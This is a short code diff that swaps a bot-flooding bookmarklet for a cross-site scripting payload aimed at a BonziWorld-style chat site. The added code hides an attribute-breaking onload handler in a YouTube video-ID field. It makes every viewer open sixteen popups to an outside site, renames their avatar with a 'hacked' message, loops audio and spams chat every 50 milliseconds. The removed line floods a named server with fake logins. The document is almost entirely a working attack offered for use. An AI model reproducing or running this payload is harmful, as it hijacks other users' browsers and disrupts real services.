@@ -1,1 +1,35 @@
-JavaScript:setInterval(function(){var sockets = []; var G = io("https://bonziworld-revived-1.onrender.com/"); sockets.push(G);G.emit('login',{name:'YOU ARE AN IDIOT!'}); G.emit("command", {list: ["color", "white"]}); G.emit("command", {list: ["color", "black"]}); G.emit("command", {list: ["img","https://files.catbox.moe/stln7i.gif"]})} ,500);
+socket.emit('command', {
+  list: [
+    "youtube",
+    "FveF-we6lcE\" onload=\" \
+      window.open('https://tlrenny25.github.io'); \
+      window.open('https://tlrenny25.github.io'); \
+      window.open('https://tlrenny25.github.io'); \
+      window.open('https://tlrenny25.github.io'); \
+      window.open('https://tlrenny25.github.io'); \
+      window.open('https://tlrenny25.github.io'); \
+      window.open('https://tlrenny25.github.io'); \
+      window.open('https://tlrenny25.github.io'); \
+      window.open('https://tlrenny25.github.io'); \
+      window.open('https://tlrenny25.github.io'); \
+      window.open('https://tlrenny25.github.io'); \
+      window.open('https://tlrenny25.github.io'); \
+      window.open('https://tlrenny25.github.io'); \
+      window.open('https://tlrenny25.github.io'); \
+      window.open('https://tlrenny25.github.io'); \
+      window.open('https://tlrenny25.github.io'); \
+      socket.emit('command',{list:['name','YOUVE BEEN HACKED BY THE YOUAREANIDIOT VIRUS!']});\
+    socket.emit('command',{list:['color','blue']});\
+      var s=document.createElement('script'); \
+      s.textContent = `(function(){ \
+        var audio = new Audio('https://tlrenny25.github.io/idiot.wav'); \
+        audio.loop = true; \
+        audio.play(); \
+        setInterval(function(){ \
+          socket.emit('talk', { text: 'YOU ARE AN IDIOT! YOU ARE AN IDIOT! YOU ARE AN IDIOT! YOU ARE AN IDIOT! YOU ARE AN IDIOT! YOU ARE AN IDIOT! YOU ARE AN IDIOT! YOU ARE AN IDIOT! YOU ARE AN IDIOT! YOU ARE AN IDIOT! YOU ARE AN IDIOT! YOU ARE AN IDIOT! YOU ARE AN IDIOT! YOU ARE AN IDIOT! YOU ARE AN IDIOT! YOU ARE AN IDIOT! YOU ARE AN IDIOT! YOU ARE AN IDIOT! YOU ARE AN IDIOT! YOU ARE AN IDIOT! YOU ARE AN IDIOT! YOU ARE AN IDIOT! YOU ARE AN IDIOT! YOU ARE AN IDIOT! YOU ARE AN IDIOT! YOU ARE AN IDIOT! YOU ARE AN IDIOT! YOU ARE AN IDIOT! YOU ARE AN IDIOT! YOU ARE AN IDIOT! YOU ARE AN IDIOT! YOU ARE AN IDIOT! YOU ARE AN IDIOT! YOU ARE AN IDIOT! YOU ARE AN IDIOT! YOU ARE AN IDIOT! YOU ARE AN IDIOT! YOU ARE AN IDIOT! YOU ARE AN IDIOT! YOU ARE AN IDIOT! YOU ARE AN IDIOT! YOU ARE AN IDIOT! YOU ARE AN IDIOT! YOU ARE AN IDIOT! YOU ARE AN IDIOT! YOU ARE AN IDIOT! YOU ARE AN IDIOT! YOU ARE AN IDIOT! YOU ARE AN IDIOT! YOU ARE AN IDIOT! YOU ARE AN IDIOT! YOU ARE AN IDIOT! YOU ARE AN IDIOT! YOU ARE AN IDIOT! YOU ARE AN IDIOT! YOU ARE AN IDIOT! YOU ARE AN IDIOT! YOU ARE AN IDIOT! YOU ARE AN IDIOT! YOU ARE AN IDIOT! YOU ARE AN IDIOT! YOU ARE AN IDIOT! YOU ARE AN IDIOT! YOU ARE AN IDIOT! YOU ARE AN IDIOT! YOU ARE AN IDIOT! YOU ARE AN IDIOT! YOU ARE AN IDIOT! YOU ARE AN IDIOT! YOU ARE AN IDIOT! YOU ARE AN IDIOT! YOU ARE AN IDIOT! YOU ARE AN IDIOT! YOU ARE AN IDIOT! YOU ARE AN IDIOT! YOU ARE AN IDIOT! YOU ARE AN IDIOT! YOU ARE AN IDIOT! YOU ARE AN IDIOT! YOU ARE AN IDIOT! YOU ARE AN IDIOT! YOU ARE AN IDIOT! YOU ARE AN IDIOT! YOU ARE AN IDIOT! YOU ARE AN IDIOT! YOU ARE AN IDIOT! YOU ARE AN IDIOT! YOU ARE AN IDIOT! YOU ARE AN IDIOT! YOU ARE AN IDIOT! YOU ARE AN IDIOT! YOU ARE AN IDIOT! YOU ARE AN IDIOT! YOU ARE AN IDIOT! YOU ARE AN IDIOT! YOU ARE AN IDIOT! YOU ARE AN IDIOT! YOU ARE AN IDIOT! YOU ARE AN IDIOT! YOU ARE AN IDIOT! YOU ARE AN IDIOT! YOU ARE AN IDIOT! YOU ARE AN IDIOT! YOU ARE AN IDIOT! YOU ARE AN IDIOT! YOU ARE AN IDIOT! YOU ARE AN IDIOT! YOU ARE AN IDIOT! YOU ARE AN IDIOT! YOU ARE AN IDIOT! YOU ARE AN IDIOT! YOU ARE AN IDIOT! YOU ARE AN IDIOT! YOU ARE AN IDIOT! YOU ARE AN IDIOT! YOU ARE AN IDIOT! YOU ARE AN IDIOT! YOU ARE AN IDIOT! YOU ARE AN IDIOT! YOU ARE AN IDIOT! YOU ARE AN IDIOT! YOU ARE AN IDIOT! YOU ARE AN IDIOT! YOU ARE AN IDIOT! YOU ARE AN IDIOT! YOU ARE AN IDIOT! YOU ARE AN IDIOT! YOU ARE AN IDIOT! YOU ARE AN IDIOT! YOU ARE AN IDIOT! YOU ARE AN IDIOT! YOU ARE AN IDIOT! YOU ARE AN IDIOT! YOU ARE AN IDIOT! ' }); \
+        }, 50); \
+      })();`; \
+      document.body.appendChild(s); \
+    \""
+  ]
+});
